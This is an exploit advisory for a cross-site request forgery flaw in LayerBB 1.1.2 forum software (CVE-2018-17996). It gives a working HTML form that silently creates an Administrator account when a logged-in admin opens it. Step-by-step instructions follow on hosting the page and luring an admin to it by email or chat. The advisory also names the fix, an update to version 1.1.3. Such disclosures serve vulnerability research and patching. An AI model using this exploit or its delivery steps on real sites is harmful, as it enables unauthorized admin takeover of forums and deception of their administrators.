# Exploit Title: LayerBB 1.1.2 - Cross-Site Request Forgery
# Date: 10/4/2018
# Author: 0xB9
# Twitter: @0xB9Sec
# Contact: 0xB9[at]pm.me
# Software Link: https://forum.layerbb.com
# Version: 1.1.2
# Tested on: Ubuntu 18.04
# CVE: CVE-2018-17996


1. Description:
LayerBB is a free open-source forum software, the CSRF allows creating a admin user.
 

2. Proof of Concept:

<!-- Create Admin User -->  
<html>
  <body>
	<form action="http://localhost/[path]/admin/new_user.php" method="POST">
        <label for="username">Username</label>
        <input name="username" id="username" value="test" type="text">
        <label for="password">Password</label>
        <input name="password" id="password" value="password123" type="password">
        <label for="email">Email Address</label>
        <input name="email" id="email" value="test@localhost.co" type="text">               
        <label for="usergroup">Usergroup</label><br>
        <select name="usergroup" id="usergroup" style="width:100%;"><option value="4">Administrator</option></select><br><br>
        <input name="create" value="Create User" type="submit">
    </form>
  </body>
</html>
<!-- Create Admin User End -->


3. Solution:
Update to 1.1.3




Instructions:

Install the Software:

Download and install LayerBB 1.1.2 on your local server (e.g., localhost with LAMP stack or similar setup).
Setup Test Environment:

Ensure LayerBB is running and accessible from a browser.
Log in to the admin panel to verify current user accounts and permissions.

Save the HTML code as create_admin.html.
Replace http://localhost/[path]/admin/new_user.php with the actual URL where LayerBB is hosted.

Host the create_admin.html file on a web server or use a local file server if testing locally.


Share the URL to the create_admin.html file with an admin or user with sufficient privileges. This could be done via email, chat, or any other method that the target might access.


After the admin or user visits the create_admin.html page, check the admin panel to see if a new admin user with the details specified in the CSRF form (test) has been created.

